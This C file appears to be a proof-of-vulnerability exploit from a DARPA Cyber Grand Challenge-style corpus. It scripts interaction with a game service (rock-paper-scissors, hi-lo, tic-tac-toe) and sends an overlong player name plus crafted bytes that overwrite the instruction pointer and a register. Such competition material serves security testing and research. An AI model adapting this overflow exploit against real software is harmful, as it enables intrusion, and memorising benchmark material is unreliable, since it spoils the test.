/*
 * Copyright (c) 2014 Kaprica Security, Inc.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 */

#include <libpov.h>
#include <libcgc.h>
#include "stdio.h"

enum {COMPUTER = 1, HUMAN = 0 };
void read_until_game_prompt()
{
    unsigned char *resp = NULL;
    unsigned int resp_len = 0;
    int ready = 0;
    while (!ready) {
        delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
        if (memcmp(resp, "Shall we play a game?", strlen("Shall we play a game?")) == 0) {
            ready = 1;
        }
    }
}

void read_until_register_prompt()
{
    unsigned char *resp = NULL;
    unsigned int resp_len = 0;
    int ready = 0;
    while (!ready) {
        delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
        if (memcmp(resp, "Enter player information: [name,flair]", strlen("Enter player information: [name,flair]")) == 0) {
            ready = 1;
        }
    }
}

int find_corner()
{
    unsigned char *resp = NULL;
    unsigned int resp_len = 0;
    delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
    delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
    int row = 0;
    for (row = 0; row < 3; row++) {
        delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
        if (row == 0) {
            if (resp[1] == 'C')
                return 0;
            if (resp[5] == 'C')
                return 1;
        }
        if (row == 2) {
            if (resp[1] == 'C')
                return 2;
            if (resp[5] == 'C')
                return 3;
        }
    }

    return -1;
}


int play_ttt(int turn)
{
    unsigned char len_resp[128];
    //unsigned int resp_len = 0;
    //unsigned char *resp = NULL;
    char *select_guess_num_game = "3\n";

    memset(len_resp, 0, 128);
    read_until_game_prompt();
    length_read(STDIN, len_resp, strlen("Game # "));
    transmit_all(STDOUT, select_guess_num_game, strlen(select_guess_num_game));

    if (turn == COMPUTER) {
        switch(find_corner()) {
        case 0:
            transmit_all(STDOUT, "1,1\n", 4);
            transmit_all(STDOUT, "0,2\n", 4);
            transmit_all(STDOUT, "1,0\n", 4);
            transmit_all(STDOUT, "2,2\n", 4);
            return 0;
        case 1:
            transmit_all(STDOUT, "1,1\n", 4);
            transmit_all(STDOUT, "0,1\n", 4);
            transmit_all(STDOUT, "1,0\n", 4);
            transmit_all(STDOUT, "2,2\n", 4);
            return 1;
        case 2:
            transmit_all(STDOUT, "1,1\n", 4);
            transmit_all(STDOUT, "1,0\n", 4);
            transmit_all(STDOUT, "2,2\n", 4);
            transmit_all(STDOUT, "0,2\n", 4);
            return 2;
        case 3:
            transmit_all(STDOUT, "1,1\n", 4);
            transmit_all(STDOUT, "2,1\n", 4);
            transmit_all(STDOUT, "0,2\n", 4);
            transmit_all(STDOUT, "1,0\n", 4);
            return 3;
        }
    } else {
        transmit_all(STDOUT, "2,0\n", 4);
        transmit_all(STDOUT, "2,1\n", 4);
        transmit_all(STDOUT, "0,0\n", 4);
        transmit_all(STDOUT, "1,2\n", 4);
        transmit_all(STDOUT, "0,2\n", 4);
        return 5;
    }
    return -1;
}

int play_rps()
{
    unsigned char len_resp[128];
    unsigned int resp_len = 0;
    unsigned char *resp = NULL;
    char *select_guess_num_game = "1\n";
    char *hammer = "HAMMER\n";

    memset(len_resp, 0, 128);
    read_until_game_prompt();
    length_read(STDIN, len_resp, strlen("Game # "));
    transmit_all(STDOUT, select_guess_num_game, strlen(select_guess_num_game));

    memset(len_resp, 0, 128);
    length_read(STDIN, len_resp, strlen("Choose [HAMMER, SHEET, SHEERS]: "));
    transmit_all(STDOUT, hammer, strlen(hammer));
    delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
    delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
    if(memcmp(resp, "You Win!", 8) == 0) {
        return 0;
    }

    return 1;
}

int play_hi_lo(int scored_game)
{
    unsigned char len_resp[128];
    unsigned int resp_len = 0;
    unsigned char *resp = NULL;
    char *guess_msg = malloc(128);
    char *guess_buf = malloc(128);
    char *select_guess_num_game = "2\n";
    char *pov_guess_num = "-1\n";
    char *normal_guess_num = "0\n";

    int num_guesses = 33;
    int guess_lower = -2147483647;
    int guess_upper = 2147483647;
    int guess = 0;
    int won = 0;

    if (scored_game) {
        pov_guess_num = normal_guess_num;
        num_guesses = 16;
        guess_upper = 0xffff;
        guess_lower = 0;
        guess = (guess_upper - guess_lower) / 2;
    }

    read_until_game_prompt();
    length_read(STDIN, len_resp, strlen("Game # "));
    transmit_all(STDOUT, select_guess_num_game, strlen(select_guess_num_game));
    length_read(STDIN, len_resp, strlen("Enter max value (Default=65535): "));
    transmit_all(STDOUT, pov_guess_num, strlen(pov_guess_num));
    if (!scored_game) {
        length_read(STDIN, len_resp, 1);
        if (len_resp[0] == 'E') {
            length_read(STDIN, len_resp, strlen("nter max value (Default=65535): "));
            transmit_all(STDOUT, normal_guess_num, strlen(normal_guess_num));
            num_guesses = 16;
            guess_upper = 0xffff;
            guess_lower = 0;
            guess = (guess_upper - guess_lower) / 2;
        } else {
            delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
            delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
            num_guesses = 33;
        }
    }

    while(num_guesses) {
        memset(guess_buf, 0, 128);
        memset(guess_msg, 0, 128);
        memset(len_resp, 0, 128);
        sprintf(guess_buf, "%d\n", guess);
        sprintf(guess_msg, "Guess the number [%d guesses left]: ", num_guesses--);
        length_read(STDIN, len_resp, strlen(guess_msg));
        transmit_all(STDOUT, guess_buf, strlen(guess_buf));
        delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);

        if (memcmp(resp, "Too Low", 7) == 0) {
            guess_lower = guess;
            guess += (guess_upper - guess_lower) / 2;
        } else if(memcmp(resp, "Too High", 8) == 0) {
            guess_upper = guess;
            guess -= (guess_upper - guess_lower) / 2;
        } else if(memcmp(resp, "You won!", 8) == 0) {
            won = 1;
            break;
        }
    }

    if (!won) {
        delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
        if (memcmp(resp, "Sorry", 5) == 0) {
            //transmit_all(STDOUT, exit, strlen(exit));
            return 0;
        }
    }
    //If POV
    transmit_all(3, (void *) &guess, sizeof(int));
    return 1;
}

int bad_char(unsigned char c)
{
    return c == 0 || c == ',';
}

int main()
{
    unsigned char len_resp[128];
    int whose_turn = 0;

    unsigned int pov_type = 1;
    unsigned int eip_mask = 0xfefefefe;
    unsigned int eax_mask = 0xfefefefe;
    unsigned int reg_num = 0; // eax
    unsigned int target_eip = 0, target_reg = 0;

    // negotiate type 1
    transmit_all(3, &pov_type, sizeof(pov_type));
    transmit_all(3, &eip_mask, sizeof(eip_mask));
    transmit_all(3, &eax_mask, sizeof(eax_mask));
    transmit_all(3, &reg_num, sizeof(reg_num));

    if (length_read(3, (unsigned char *)&target_eip, sizeof(target_eip)) != sizeof(target_eip))
        return -1;
    if (length_read(3, (unsigned char *)&target_reg, sizeof(target_reg)) != sizeof(target_reg))
        return -1;

    char *register_player = "1\nPovPlayer, 1\n";
    char *reregister_player_pov = "4\n1\n12345678901234567890123\n";
    char *exit = "4\n2\n";

    transmit_all(STDOUT, register_player, strlen(register_player));
    read_until_game_prompt();
    transmit_all(STDOUT, reregister_player_pov, strlen(reregister_player_pov));

    // eip overwrite
    target_eip |= 0x01010101;
    transmit_all(STDOUT, &target_eip, sizeof(target_eip));
    // reg overwrite
    target_reg ^=0xDEADBEEF;
    target_reg -=2000;
    if (bad_char(target_reg >> 0)) target_reg |= 0x01;
    if (bad_char(target_reg >> 8)) target_reg |= 0x0100;
    if (bad_char(target_reg >> 16)) target_reg |= 0x010000;
    if (bad_char(target_reg >> 24)) target_reg |= 0x01000000;
    transmit_all(STDOUT, &target_reg, sizeof(target_reg));
    transmit_all(STDOUT, ",\n", 2);

    read_until_register_prompt();
    length_read(STDIN, len_resp, 1);
    if (len_resp[0] == 'F') {
        transmit_all(STDOUT, register_player, strlen(register_player));
    }

    while (play_rps());
    play_hi_lo(1);

    int num_ttt_draws= 0;
    while (num_ttt_draws <= 100) {
        play_ttt(whose_turn++ % 2);
        num_ttt_draws++;
    }

    read_until_game_prompt();
    transmit_all(STDOUT, exit, strlen(exit));
    return 0;
}
